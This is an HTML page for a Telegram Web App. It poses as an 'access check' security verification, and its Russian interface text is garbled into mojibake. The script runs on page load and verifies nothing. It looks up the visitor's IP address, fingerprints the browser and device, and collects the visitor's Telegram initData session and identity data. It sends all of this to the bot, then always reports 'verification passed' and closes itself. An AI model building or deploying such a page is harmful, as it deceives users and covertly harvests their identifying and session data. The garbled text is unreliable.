<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        
        .container {
            max-width: 500px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #2ed573;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        
        .success-icon {
            width: 80px;
            height: 80px;
            background: #2ed573;
            border-radius: 50%;
            margin: 20px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            animation: scaleIn 0.5s ease;
        }
        
        .step {
            margin: 15px 0;
            padding: 10px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: left;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes scaleIn {
            0% { transform: scale(0); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ -->
    <div id="loadingScreen" class="container">
        <h1>üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞</h1>
        <p>–ò–¥–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...</p>
        <div class="loader"></div>
        <div class="step" id="statusText">–ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞...</div>
    </div>
    
    <!-- –≠–∫—Ä–∞–Ω —É—Å–ø–µ—Ö–∞ -->
    <div id="successScreen" class="container hidden">
        <div class="success-icon">‚úì</div>
        <h1>‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞!</h1>
        <p>–í—ã —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.</p>
        <div class="step">
            ‚úÖ <strong>–í—ã –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É!</strong><br>
            –ú–æ–∂–µ—Ç–µ –∑–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ.
        </div>
    </div>

    <script>
        // –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø
        async function startVerification() {
            try {
                // 1. –ü–æ–ª—É—á–∞–µ–º IP
                document.getElementById('statusText').textContent = "–ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞...";
                let ip = "–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    ip = data.ip;
                } catch (e) {
                    try {
                        const response = await fetch('https://api64.ipify.org?format=json');
                        const data = await response.json();
                        ip = data.ip;
                    } catch (e2) {
                        ip = "–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                    }
                }
                
                document.getElementById('statusText').textContent = `IP –ø–æ–ª—É—á–µ–Ω: ${ip}`;
                
                // 2. –°–æ–±–∏—Ä–∞–µ–º –í–°–ï –¥–∞–Ω–Ω—ã–µ
                const collectedData = {
                    ip: ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
                // 3. –î–æ–±–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ Telegram –µ—Å–ª–∏ –µ—Å—Ç—å
                if (window.Telegram && Telegram.WebApp) {
                    const tg = Telegram.WebApp;
                    collectedData.telegram = {
                        initData: tg.initData || '',
                        initDataUnsafe: tg.initDataUnsafe || {},
                        version: tg.version || '',
                        platform: tg.platform || '',
                        colorScheme: tg.colorScheme || ''
                    };
                }
                
                // 4. –û–¢–ü–†–ê–í–õ–Ø–ï–ú –î–ê–ù–ù–´–ï –í –ë–û–¢–ê
                if (window.Telegram && Telegram.WebApp && Telegram.WebApp.sendData) {
                    Telegram.WebApp.sendData(JSON.stringify(collectedData));
                    console.log('‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ –±–æ—Ç–∞:', collectedData);
                } else {
                    console.log('‚ùå Telegram WebApp –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }
                
                // 5. –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω —É—Å–ø–µ—Ö–∞
                setTimeout(() => {
                    document.getElementById('loadingScreen').classList.add('hidden');
                    document.getElementById('successScreen').classList.remove('hidden');
                    
                    // –ê–≤—Ç–æ–∑–∞–∫—Ä—ã—Ç–∏–µ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        if (window.Telegram && Telegram.WebApp && Telegram.WebApp.close) {
                            Telegram.WebApp.close();
                        }
                    }, 3000);
                }, 1000);
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                document.getElementById('statusText').textContent = "–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏";
                setTimeout(() => {
                    document.getElementById('loadingScreen').classList.add('hidden');
                    document.getElementById('successScreen').classList.remove('hidden');
                }, 1000);
            }
        }
        
        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(startVerification, 1000);
        });
    </script>
</body>
</html>
